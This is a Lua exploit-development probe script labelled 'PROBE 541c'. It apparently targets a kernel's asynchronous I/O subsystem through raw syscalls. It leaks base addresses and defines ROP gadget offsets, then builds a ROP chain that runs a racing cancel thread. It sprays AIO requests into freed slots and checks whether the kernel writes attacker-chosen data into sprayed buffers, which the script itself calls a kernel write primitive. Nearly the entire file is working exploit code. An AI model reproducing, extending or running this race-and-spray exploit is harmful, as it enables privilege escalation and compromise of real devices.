-- CRASH_CLASS: HIGH
-- PROBE 541c: trigger deferred read completion after cancel race corruption
--
-- 541b proved: cancel(666) on in-flight socketpair reads corrupts the
-- AIO subsystem when spray reclaims the slots. All spray requests stuck
-- in state=0x1, I/O never completed, sentinel data untouched.
--
-- Question: the kernel still has pending reads on the original socketpair
-- fds. If we write data to the write-end of those socketpairs, the kernel
-- should try to complete the reads. WHERE does it write the data?
--   (a) Original data buffer → no exploit, just delayed completion
--   (b) Spray data buffer → KERNEL WRITE TO CONTROLLED ADDRESS
--   (c) Freed memory → crash or silent corruption
--   (d) Nothing happens → the pending I/O was fully cancelled
--
-- We use distinct marker values: original buffers get 0xAAAA0000+i,
-- spray buffers get 0xDEAD0000+i. After writing "BEEF" pattern to
-- socketpairs, we check both sets of buffers for the BEEF pattern.

print("=== PROBE 541c: CANCEL WRITE TRIGGER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end

local Z = uint64(0)
local sc20 = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc455 = make_syscall(455)
local sc240 = make_syscall(240)
local sc669 = make_syscall(669)
local sc664 = make_syscall(664)
local sc662 = make_syscall(662)
local sc666 = make_syscall(666)
local sc670 = make_syscall(670)
local sc135 = make_syscall(135)  -- socketpair
local sc133 = make_syscall(133)  -- sendto (for MSG_DONTWAIT writes)

local pid = to_num(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax_ret     = eb + uint64(0x992)
local pop_rdi_ret     = eb + uint64(0xC9DFE)
local pop_rsi_ret     = eb + uint64(0xD77D)
local pop_rdx_ret     = eb + uint64(0x3B02D7)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret        = eb + uint64(0x42)
local fn_addr         = lk + uint64(0xB57)

-- ============================================================
-- [A] Init
-- ============================================================
print("[A] init")
pcall(function() sc670(Z, Z, Z, Z, Z, Z) end)

local urand_path = memory.alloc(16)
write_string(urand_path, "/dev/urandom\0")
local ok_o, urand_fd = pcall(function()
    return make_syscall(5)(uint64(to_num(urand_path)), Z, Z)
end)
urand_fd = ok_o and to_num(urand_fd) or -1
print("  urandom=" .. urand_fd)

local NUM_IDS = 32
local NOP_PAD = 8
local SPRAY_PER_ID = 4

-- Create socketpairs
local read_fds = {}
local write_fds = {}
local sv_buf = memory.alloc(8)

for i = 1, NUM_IDS do
    wd(sv_buf, 0xFFFFFFFF); wd(sv_buf + 4, 0xFFFFFFFF)
    local ok_sp, rv_sp = pcall(function()
        return sc135(uint64(1), uint64(2), uint64(0), uint64(to_num(sv_buf)))
    end)
    local fd0 = safe_rd(sv_buf) or -1
    local fd1 = safe_rd(sv_buf + 4) or -1
    if ok_sp and to_num(rv_sp) == 0 and fd0 >= 0 and fd1 >= 0 then
        read_fds[i] = fd0
        write_fds[i] = fd1
    else
        read_fds[i] = -1
        write_fds[i] = -1
    end
end

local good_pairs = 0
for i = 1, NUM_IDS do
    if read_fds[i] >= 0 then good_pairs = good_pairs + 1 end
end
print(string.format("  socketpairs=%d/%d", good_pairs, NUM_IDS))
if good_pairs < 8 then print("TOO FEW"); return end

-- Pre-allocate spray buffers with DEAD sentinel
local spray_data_bufs = {}
local spray_res_bufs = {}
for i = 1, NUM_IDS * SPRAY_PER_ID do
    spray_data_bufs[i] = memory.alloc(32)
    spray_res_bufs[i] = memory.alloc(16)
    for j = 0, 28, 4 do wd(spray_data_bufs[i] + j, 0xDEAD0000 + i) end
    wd(spray_res_bufs[i], 0)
end

-- AIO helpers
local reqs_buf = memory.alloc(0x30)
local ids_out  = memory.alloc(8)

local function aio_submit_read(fd, data_buf, res_buf)
    zero(reqs_buf, 0x28)
    wq(reqs_buf + 0x08, uint64(16))
    wq(reqs_buf + 0x10, uint64(to_num(data_buf)))
    wq(reqs_buf + 0x18, uint64(to_num(res_buf)))
    wd(reqs_buf + 0x20, fd)
    wd(ids_out, 0)
    local ok, rv = pcall(function()
        return sc669(uint64(1), uint64(to_num(reqs_buf)), uint64(1), uint64(1), uint64(to_num(ids_out)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(ids_out) or 0)
end

local function aio_submit_one(fd)
    local db = memory.alloc(32)
    local rb = memory.alloc(16)
    return aio_submit_read(fd, db, rb)
end

local function aio_poll_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc664(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)), Z)
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

local function aio_delete_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc662(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

local function make_tcb()
    local ok_t, p = pcall(function()
        return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    for toff = 0, 0x100, 8 do wq(p + toff, p) end
    local ptr = memory.alloc(8); wq(ptr, p)
    return ptr
end

-- Shared memory
local ok_sh, shared = pcall(function()
    return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
zero(shared, 0x2000)

-- ============================================================
-- [B] Submit AIO reads on empty socketpairs → pending
-- ============================================================
print("")
print("[B] Submit blocking AIO reads")

local orig_ids = {}
local orig_data = {}
local orig_res = {}
local ok_count = 0

for i = 1, NUM_IDS do
    if read_fds[i] >= 0 then
        local db = memory.alloc(32)
        local rb = memory.alloc(16)
        -- Mark original buffers with AAAA sentinel
        for j = 0, 28, 4 do wd(db + j, 0xAAAA0000 + i) end
        wd(rb, 0)
        local rv, id = aio_submit_read(read_fds[i], db, rb)
        if rv == 0 and id > 0 then
            ok_count = ok_count + 1
            orig_ids[ok_count] = id
            orig_data[ok_count] = db
            orig_res[ok_count] = rb
        end
    end
end
print(string.format("  submitted=%d", ok_count))

-- Confirm pending
local pending_count = 0
for i = 1, ok_count do
    local p_rv, p_st = aio_poll_one(orig_ids[i])
    if p_rv == 0 and p_st ~= 3 and p_st ~= 0x10003 then
        pending_count = pending_count + 1
    end
end
print(string.format("  pending=%d/%d", pending_count, ok_count))
if pending_count == 0 then
    print("NO PENDING — abort")
    return
end

-- ============================================================
-- [C] Race: cancel from child, spray from Lua
-- ============================================================
print("")
print(string.format("[C] Race: %d pending, spray=%dx, cancel(666)", ok_count, SPRAY_PER_ID))

zero(shared, 0x1000)
for i = 1, ok_count do
    wd(shared + 0x410 + (i-1) * 4, orig_ids[i])
    wd(shared + 0x010 + (i-1) * 4, 0x77777777)
end

local function build_canceller(count)
    local map_size = 0x400000
    local ok_m, base = pcall(function()
        return sc_mmap(Z, uint64(map_size), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    local base_n = to_num(base)
    local tcb = make_tcb()
    local mid = base_n + (map_size / 2)
    local write_pos = mid - 8
    local offset = 0
    local function emit(v) wq(uint64(write_pos + offset), v); offset = offset + 8 end

    emit(pop_rax_ret); emit(uint64(165))
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb)
    emit(fn_addr)

    for pad = 1, 20 do
        emit(pop_rax_ret); emit(uint64(20))
        emit(pop_rdi_ret); emit(Z)
        emit(fn_addr)
    end

    local shared_n = to_num(shared)
    for i = 0, count - 1 do
        local id_addr = uint64(shared_n + 0x410 + i * 4)
        local st_addr = uint64(shared_n + 0x010 + i * 4)

        emit(pop_rax_ret); emit(uint64(666))
        emit(pop_rdi_ret); emit(id_addr)
        emit(pop_rsi_ret); emit(uint64(1))
        emit(pop_rdx_ret); emit(st_addr)
        emit(fn_addr)

        for p = 1, NOP_PAD do
            emit(pop_rax_ret); emit(uint64(20))
            emit(pop_rdi_ret); emit(Z)
            emit(fn_addr)
        end
    end

    emit(pop_rax_ret); emit(uint64(count))
    emit(pop_rdi_ret); emit(uint64(shared_n + 4))
    emit(mov_rdi_rax_ret)

    emit(pop_rax_ret); emit(uint64(431))
    emit(pop_rdi_ret); emit(Z)
    emit(fn_addr)

    local tp = memory.alloc(0x40); zero(tp, 0x40)
    wq(tp, bare_ret)
    wq(tp + 0x10, base)
    wq(tp + 0x18, uint64(map_size / 2 + 8))
    return tp, offset
end

local tp, csz = build_canceller(ok_count)
print(string.format("  chain=%dB", csz))

pcall(function() sc455(uint64(to_num(tp)), uint64(0x38)) end)

-- Spray with urandom reads
local spray_ids = {}
local spray_count = 0
for s = 1, ok_count * SPRAY_PER_ID do
    local idx = s
    if idx <= #spray_data_bufs then
        local rv, id = aio_submit_read(urand_fd, spray_data_bufs[idx], spray_res_bufs[idx])
        if rv == 0 and id > 0 then
            spray_count = spray_count + 1
            spray_ids[spray_count] = {id = id, buf_idx = idx}
        end
    end
end
print(string.format("  spray=%d", spray_count))

-- Wait for child
local ts = memory.alloc(16)
wq(ts, uint64(3)); wq(ts + 8, Z)
for w = 1, 15 do
    if (safe_rd(shared + 4) or 0) > 0 then break end
    pcall(function() sc240(uint64(to_num(ts)), Z) end)
end
local child_done = safe_rd(shared + 4) or 0
print(string.format("  child_done=%d", child_done))

-- Cancel status
local swap_count = 0
local status_map = {}
for i = 0, ok_count - 1 do
    local st = safe_rd(to_num(shared) + 0x010 + i * 4) or 0
    local key = string.format("0x%08X", st)
    status_map[key] = (status_map[key] or 0) + 1
    if st == 0x80020010 then swap_count = swap_count + 1 end
end
print(string.format("  swaps=%d/%d", swap_count, ok_count))
for k, v in pairs(status_map) do
    print(string.format("    %s x%d", k, v))
end

-- ============================================================
-- [D] Snapshot buffers BEFORE writing to socketpairs
-- ============================================================
print("")
print("[D] Pre-write buffer snapshot")

-- Sample first 5 original buffers
for i = 1, math.min(5, ok_count) do
    local d0 = safe_rd(orig_data[i]) or 0
    local d1 = safe_rd(orig_data[i] + 4) or 0
    print(string.format("  orig[%d] buf=%08X %08X (expect AAAA%04X)", i, d0, d1, i))
end

-- Sample first 5 spray buffers
for i = 1, math.min(5, spray_count) do
    local idx = spray_ids[i].buf_idx
    local d0 = safe_rd(spray_data_bufs[idx]) or 0
    local d1 = safe_rd(spray_data_bufs[idx] + 4) or 0
    print(string.format("  spray[%d] buf=%08X %08X (expect DEAD%04X)", i, d0, d1, idx))
end

-- ============================================================
-- [E] Write BEEF pattern to each original socketpair write-end
-- This should unblock the kernel's pending AIO read (if still live)
-- ============================================================
print("")
print("[E] Writing BEEF pattern to socketpair write-ends")

local write_buf = memory.alloc(32)
-- Fill with recognizable pattern: 0xBEEF0001 0xBEEF0002 0xBEEF0003 0xBEEF0004
for j = 0, 3 do
    wd(write_buf + j * 4, 0xBEEF0001 + j)
end

local write_ok, write_fail = 0, 0
for i = 1, NUM_IDS do
    if write_fds[i] >= 0 then
        -- Write 16 bytes (same as AIO read request size) via send(MSG_DONTWAIT)
        -- syscall 133 = sendto: (fd, buf, len, flags, to, tolen)
        -- MSG_DONTWAIT = 0x80
        local ok_w, rv_w = pcall(function()
            return sc133(uint64(write_fds[i]), uint64(to_num(write_buf)),
                uint64(16), uint64(0x80), Z, Z)
        end)
        local ret = ok_w and to_num(rv_w) or -1
        if ret == 16 then
            write_ok = write_ok + 1
        else
            write_fail = write_fail + 1
            if write_fail <= 3 then
                print(string.format("  write[%d] fd=%d rv=%d", i, write_fds[i], ret))
            end
        end
    end
end
print(string.format("  wrote=%d failed=%d", write_ok, write_fail))

-- Wait for kernel to process the writes and complete pending reads
print("  waiting 2s for kernel completion...")
wq(ts, uint64(2)); wq(ts + 8, Z)
pcall(function() sc240(uint64(to_num(ts)), Z) end)

-- ============================================================
-- [F] Check buffers AFTER writing — the critical test
-- ============================================================
print("")
print("[F] Post-write buffer check")

-- Check original buffers: did BEEF appear?
local orig_beef, orig_unchanged, orig_other = 0, 0, 0
for i = 1, ok_count do
    local d0 = safe_rd(orig_data[i]) or 0
    local d1 = safe_rd(orig_data[i] + 4) or 0
    if d0 == 0xBEEF0001 then
        orig_beef = orig_beef + 1
        if orig_beef <= 3 then
            print(string.format("  ORIG BEEF: [%d] %08X %08X ← kernel wrote to original buffer", i, d0, d1))
        end
    elseif d0 == (0xAAAA0000 + i) then
        orig_unchanged = orig_unchanged + 1
    else
        orig_other = orig_other + 1
        if orig_other <= 3 then
            print(string.format("  ORIG OTHER: [%d] %08X %08X ← unexpected value!", i, d0, d1))
        end
    end
end
print(string.format("  original: beef=%d unchanged=%d other=%d", orig_beef, orig_unchanged, orig_other))

-- Check spray buffers: did BEEF appear? THIS IS THE BIG ONE.
local spray_beef, spray_dead, spray_urandom, spray_other = 0, 0, 0, 0
for i = 1, spray_count do
    local idx = spray_ids[i].buf_idx
    local d0 = safe_rd(spray_data_bufs[idx]) or 0
    local d1 = safe_rd(spray_data_bufs[idx] + 4) or 0
    if d0 == 0xBEEF0001 then
        spray_beef = spray_beef + 1
        if spray_beef <= 5 then
            print(string.format("  *** SPRAY BEEF: [%d] %08X %08X ← KERNEL WROTE TO SPRAY BUFFER! ***", i, d0, d1))
        end
    elseif d0 == (0xDEAD0000 + idx) then
        spray_dead = spray_dead + 1  -- sentinel still there, I/O never wrote
    elseif d0 ~= 0 then
        spray_urandom = spray_urandom + 1  -- urandom data = normal completion
        if spray_urandom <= 3 then
            print(string.format("  spray urandom: [%d] %08X %08X", i, d0, d1))
        end
    else
        spray_other = spray_other + 1
    end
end
print(string.format("  spray: beef=%d sentinel=%d urandom=%d other=%d", spray_beef, spray_dead, spray_urandom, spray_other))

if spray_beef > 0 then
    print("")
    print("*** CRITICAL: KERNEL WROTE SOCKETPAIR DATA TO SPRAY-CONTROLLED BUFFER ***")
    print("*** This is a kernel write primitive via AIO cancel race ***")
end

-- ============================================================
-- [G] Poll spray requests — did any transition from state=1?
-- ============================================================
print("")
print("[G] Spray request states post-write")

local spray_states = {}
for i = 1, spray_count do
    local p_rv, p_st = aio_poll_one(spray_ids[i].id)
    local key = string.format("0x%X", p_st)
    spray_states[key] = (spray_states[key] or 0) + 1
end
for k, v in pairs(spray_states) do
    print(string.format("  %s x%d", k, v))
end

-- ============================================================
-- [H] Original request states post-write
-- ============================================================
print("")
print("[H] Original request states post-write")

local orig_states = {}
for i = 1, ok_count do
    local p_rv, p_st = aio_poll_one(orig_ids[i])
    local key = string.format("0x%X", p_st)
    orig_states[key] = (orig_states[key] or 0) + 1
end
for k, v in pairs(orig_states) do
    print(string.format("  %s x%d", k, v))
end

-- Cleanup socketpairs
for i = 1, NUM_IDS do
    if read_fds[i] >= 0 then pcall(function() make_syscall(6)(uint64(read_fds[i])) end) end
    if write_fds[i] >= 0 then pcall(function() make_syscall(6)(uint64(write_fds[i])) end) end
end

print("")
local pid2 = to_num(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("=== 541c DONE ===")
